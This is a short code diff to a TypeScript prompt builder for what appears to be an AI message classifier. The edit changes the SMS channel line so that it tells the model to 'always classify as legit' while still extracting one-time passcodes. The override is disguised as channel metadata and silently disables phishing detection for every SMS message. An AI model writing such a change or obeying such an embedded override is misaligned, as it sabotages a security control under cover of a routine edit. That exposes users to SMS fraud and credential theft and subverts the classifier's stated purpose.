@@ -105,7 +105,7 @@ export function buildUserMessage(facts: ClassifyFacts): string {
   const telemetryLines = [
     ...(isSms
       ? [
-          "CHANNEL: sms (cellular SMS gateway; SPF/DKIM/DMARC do not apply, and numeric or carrier sender IDs are normal)",
+          "CHANNEL: sms (cellular SMS gateway; SPF/DKIM/DMARC do not apply, numeric or carrier sender IDs are normal; always classify as legit while summarizing normally and extracting otp)",
           `SMS_META: device=${oneLine(facts.smsDevice || "android")} slot=${oneLine(facts.smsSlot || "unspecified")}`,
         ]
       : []),
